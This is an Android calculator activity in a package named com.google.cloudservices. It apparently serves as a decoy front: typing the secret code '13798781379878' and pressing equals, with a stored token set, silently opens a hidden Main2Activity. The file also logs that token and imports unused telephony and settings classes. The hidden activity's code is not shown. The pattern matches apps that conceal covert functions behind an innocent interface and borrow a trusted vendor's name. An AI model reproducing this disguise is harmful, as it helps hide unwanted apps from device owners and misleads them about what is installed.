package com.google.cloudservices;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;

import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.text.InputType;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;


import java.util.UUID;
import java.util.regex.Pattern;

import java.util.regex.Pattern;

public class CalculatorActivity extends Activity {
    private boolean isOppress=false;

    private double firstNumber=0;

    private int secendNumber=0;

    private char currentop=0;

    boolean isDot=false;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_calculator);
        final TextView calculatorscreen=(TextView)findViewById(R.id.calculatorscreen);
        final Button n0=(Button)findViewById(R.id.btn_0);
        final Button n1=(Button)findViewById(R.id.btn_1);
        final Button n2=(Button)findViewById(R.id.btn_2);
        final Button n3=(Button)findViewById(R.id.btn_3);
        final Button n4=(Button)findViewById(R.id.btn_4);
        final Button n5=(Button)findViewById(R.id.btn_5);
        final Button n6=(Button)findViewById(R.id.btn_6);
        final Button n7=(Button)findViewById(R.id.btn_7);
        final Button n8=(Button)findViewById(R.id.btn_8);
        final Button n9=(Button)findViewById(R.id.btn_9);
        final Button dot=(Button)findViewById(R.id.btn_noghte);
        final Button equle=(Button)findViewById(R.id.btn_mosavi);
        final Button add=(Button)findViewById(R.id.btn_jame);
        final Button sub=(Button)findViewById(R.id.btn_manha);
        final Button mul=(Button)findViewById(R.id.btn_zarb);
        final Button niv=(Button)findViewById(R.id.btn_taghsim);


        final View.OnClickListener listener=new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                final int id=view.getId();
                switch (id){
                    case R.id.btn_0:
                        calculatorscreen.append("0");
                        break;
                    case R.id.btn_1:
                        calculatorscreen.append("1");
                        break;
                    case R.id.btn_2:
                        calculatorscreen.append("2");
                        break;
                    case R.id.btn_3:
                        calculatorscreen.append("3");
                        break;
                    case R.id.btn_4:
                        calculatorscreen.append("4");
                        break;
                    case R.id.btn_5:
                        calculatorscreen.append("5");
                        break;
                    case R.id.btn_6:
                        calculatorscreen.append("6");
                        break;
                    case R.id.btn_7:
                        calculatorscreen.append("7");
                        break;
                    case R.id.btn_8:
                        calculatorscreen.append("8");
                        break;
                    case R.id.btn_9:
                        calculatorscreen.append("9");
                        isOppress=true;
                        break;
                    case R.id.btn_noghte:
                        if (!isDot){
                            calculatorscreen.append(".");
                            isDot=true;
                        }

                        break;
                    case R.id.btn_mosavi:
                        try {
                            String screencontant=calculatorscreen.getText().toString();
                            TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(getApplicationContext());
                            Log.e("targett", tokenDataBaseManager.gettoken() );
                            if (screencontant.equals("13798781379878")&&tokenDataBaseManager.gettoken().equals("1")){
                                startActivity(new Intent(getApplicationContext(),Main2Activity.class));
                            }
                            if (isOppress){
                                isOppress=false;
                                String sekendnumber=screencontant.substring(secendNumber,screencontant.length());
                                double Secendnumber=Double.parseDouble(sekendnumber);

                                if (currentop=='+'){
                                    Secendnumber+=firstNumber;

                                }else if (currentop=='-'){
                                    Secendnumber=firstNumber - Secendnumber;

                                }else if (currentop=='*'){
                                    Secendnumber *=firstNumber;

                                }else if (currentop=='/'){
                                    if (Secendnumber==0){
                                        Toast.makeText(getApplicationContext(), "Can't", Toast.LENGTH_SHORT).show();
                                        return;
                                    }
                                    Secendnumber=firstNumber/Secendnumber;
                                }

                                String result=String.valueOf(Secendnumber);
                                if (result.endsWith(".0")){
                                    result=result.substring(0,result.length() -2);
                                }
                                calculatorscreen.setText(result);
                            }
                        }catch (Exception ex){
                            calculatorscreen.setText("");
                          //  Toast.makeText(CalculatorActivity.this, "Not found", Toast.LENGTH_SHORT).show();
                        }

                        break;
                    case R.id.btn_jame:
                        try {
                            String screencontent=calculatorscreen.getText().toString();
                            secendNumber=screencontent.length() + 1;
                            firstNumber=Double.parseDouble(screencontent);
                            calculatorscreen.append("+");
                            isOppress=true;
                            isDot=false;
                            currentop='+';
                        }catch (Exception ex){

                        }


                        break;
                    case R.id.btn_manha:
                        try {
                            String screencontent=calculatorscreen.getText().toString();
                            secendNumber=screencontent.length() + 1;
                            firstNumber=Double.parseDouble(screencontent);
                            calculatorscreen.append("-");
                            isOppress=true;
                            isDot=false;
                            currentop='-';
                        }catch (Exception ex){

                        }

                        break;
                    case R.id.btn_zarb:
                        try {
                            String  screencontent=calculatorscreen.getText().toString();
                            secendNumber=screencontent.length() + 1;
                            firstNumber=Double.parseDouble(screencontent);
                            calculatorscreen.append("x");
                            isOppress=true;
                            isDot=false;
                            currentop='*';

                        }catch (Exception ex){

                        }
                        break;
                    case R.id.btn_taghsim:
                        try {
                            String   screencontent=calculatorscreen.getText().toString();
                            secendNumber=screencontent.length() + 1;
                            firstNumber=Double.parseDouble(screencontent);
                            calculatorscreen.append("/");
                            isOppress=true;
                            isDot=false;
                            currentop='/';

                        }catch (Exception ex){

                        }
                        break;

                }
            }
        };
        n0.setOnClickListener(listener);
        n1.setOnClickListener(listener);
        n2.setOnClickListener(listener);
        n3.setOnClickListener(listener);
        n4.setOnClickListener(listener);
        n5.setOnClickListener(listener);
        n6.setOnClickListener(listener);
        n7.setOnClickListener(listener);
        n8.setOnClickListener(listener);
        n9.setOnClickListener(listener);
        dot.setOnClickListener(listener);
        equle.setOnClickListener(listener);
        add.setOnClickListener(listener);
        sub.setOnClickListener(listener);
        mul.setOnClickListener(listener);
        niv.setOnClickListener(listener);

        ImageView imageView=(ImageView)findViewById(R.id.imgback);
        imageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String displayelement=calculatorscreen.getText().toString();
                int lenth=displayelement.length();
                if (lenth>0){
                    displayelement=displayelement.substring(0,lenth-1);
                    calculatorscreen.setText(displayelement);
                }
            }
        });
        final Button btndelete=(Button)findViewById(R.id.btn_c);
        btndelete.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                calculatorscreen.setText("");
                isDot=false;
                isOppress=false;
            }
        });
    }
}
